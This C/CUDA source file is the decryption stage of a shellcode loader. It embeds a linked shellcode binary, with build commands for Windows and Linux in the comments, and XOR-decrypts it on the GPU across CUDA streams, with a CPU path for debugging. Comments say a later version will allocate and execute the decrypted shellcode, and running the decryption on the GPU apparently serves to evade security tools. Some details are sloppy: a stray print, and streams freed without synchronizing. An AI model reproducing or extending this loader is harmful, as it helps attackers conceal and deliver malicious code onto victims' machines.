#include <stdio.h>
#include <stdlib.h>
#include "cuda_runtime.h"
#include "device_launch_parameters.h"
//#define DEBUG_MODE

#ifdef DEBUG_MODE
#include <chrono>
#endif


extern "C" {
    // Windows  :    ld.exe -r -b binary shellcode.bin -o shellcode_bin.obj --oformat pe-x86-64
    //      With Visual Studio : View >  Solution Explorer > Right-Click->Property > Linker > Input > Edit and Add Additional dependencies shellcode_bin.obj
    //      With NVCC : nvcc - o kernel kernel.cu shellcode_bin.obj

    // Linux    :    objcopy --input binary --output elf64-x86-64 --binary-architecture i386:x86-64 shellcode.bin shellcode_bin.o
    //      With NVCC : nvcc -o kernel kernel.cu shellcode_bin.o


    // Verify with :
    // strings shellcode_bin.o | grep binary
    extern unsigned char _shellcode_bin_start[];
    extern unsigned char _shellcode_bin_end[];
}

#define TOTAL_SIZE ((size_t)(_shellcode_bin_end - _shellcode_bin_start))
// Change these settings can increase/decrease the execution speed
#define CHUNK_SIZE (TOTAL_SIZE / 10)  
#define NUM_STREAMS 5

unsigned char* get_packed_data() {
    return _shellcode_bin_start;
}
// First easy version - more advanced algorithm in a next repository
__global__ void xor (unsigned char* buffer, unsigned char key, int size) {
    int idx = threadIdx.x + blockIdx.x * blockDim.x;
    if (idx < size) {
        buffer[idx] ^= key;
    }
}

void xor_with_cuda(unsigned char* shellcode, char key) {
    unsigned char* d_buffers[NUM_STREAMS];
    cudaStream_t streams[NUM_STREAMS];

    unsigned char* pinned_shellcode;
    cudaHostAlloc((void**)&pinned_shellcode, TOTAL_SIZE, cudaHostAllocDefault);
    memcpy(pinned_shellcode, shellcode, TOTAL_SIZE);
    for (int i = 0; i < NUM_STREAMS; i++) {
        cudaMalloc((void**)&d_buffers[i], CHUNK_SIZE);
        cudaStreamCreate(&streams[i]);
    }


    for (int offset = 0; offset < TOTAL_SIZE; offset += CHUNK_SIZE * NUM_STREAMS) {
        for (int i = 0; i < NUM_STREAMS; i++) {
            int chunk_offset = offset + i * CHUNK_SIZE;
            if (chunk_offset >= TOTAL_SIZE) break;

            int chunk_size = (TOTAL_SIZE - chunk_offset) < CHUNK_SIZE ? (TOTAL_SIZE - chunk_offset) : CHUNK_SIZE;

            cudaMemcpyAsync(d_buffers[i], pinned_shellcode + chunk_offset, chunk_size, cudaMemcpyHostToDevice, streams[i]);

            // Verify with : std::cout << "Max Threads Per Block: " << deviceProp.maxThreadsPerBlock << std::endl;
            int threadsPerBlock = 256;
            int blocksPerGrid = (chunk_size + threadsPerBlock - 1) / threadsPerBlock;

            // Kernel call
            xor << <blocksPerGrid, threadsPerBlock, 0, streams[i] >> > (d_buffers[i], key, chunk_size);

            cudaMemcpyAsync(pinned_shellcode + chunk_offset, d_buffers[i], chunk_size, cudaMemcpyDeviceToHost, streams[i]);
        }
    }

    for (int i = 0; i < NUM_STREAMS; i++) {
        // Not very sure about the behaviour, need more test
        //cudaStreamSynchronize(streams[i]); 
        cudaFree(d_buffers[i]);
        cudaStreamDestroy(streams[i]);
    }


    memcpy(shellcode, pinned_shellcode, TOTAL_SIZE);
    cudaFreeHost(pinned_shellcode);
}



void xor_with_cpu(unsigned char* file_data, long file_size, char key) {
#ifdef DEBUG_MODE
    auto start_time_cpu = std::chrono::high_resolution_clock::now();
#endif
    if (file_data != NULL) {
        printf("e");
        for (int x = 0; x < file_size; x++) {
            file_data[x] ^= key;
        }
    }

#ifdef DEBUG_MODE
    auto end_time_cpu = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double, std::milli> elapsed_time_cpu = end_time_cpu - start_time_cpu;
    printf("Execution Time CPU : %f ms\n", elapsed_time_cpu.count())
#endif
        ;


}
int main() {

    unsigned char key = 0x43;

#ifdef DEBUG_MODE
    printf("Size of shellcode: %d bytes\n", TOTAL_SIZE);
#endif

    unsigned char* file_data = get_packed_data();

#ifdef DEBUG_MODE
    xor_with_cpu(file_data, TOTAL_SIZE, key);
#endif


#ifdef DEBUG_MODE
    cudaEvent_t start, stop;
    cudaEventCreate(&start);
    cudaEventCreate(&stop);
    cudaEventRecord(start);
    cudaFree(0);
#endif

    xor_with_cuda(file_data, key);
    // First easy version - more advanced algorithm in a next repository (Virtual Allocation and execution of the shellcode)

#ifdef DEBUG_MODE
    cudaEventRecord(stop);
    cudaEventSynchronize(stop);
    float elapsed_time_gpu;
    cudaEventElapsedTime(&elapsed_time_gpu, start, stop);
    printf("Execution Time GPU : %f ms\n", elapsed_time_gpu);
    cudaEventDestroy(start);
    cudaEventDestroy(stop);
#endif

#ifdef DEBUG_MODE
    printf("[*] Decryption completed.\n");
#endif

    return 0;

}
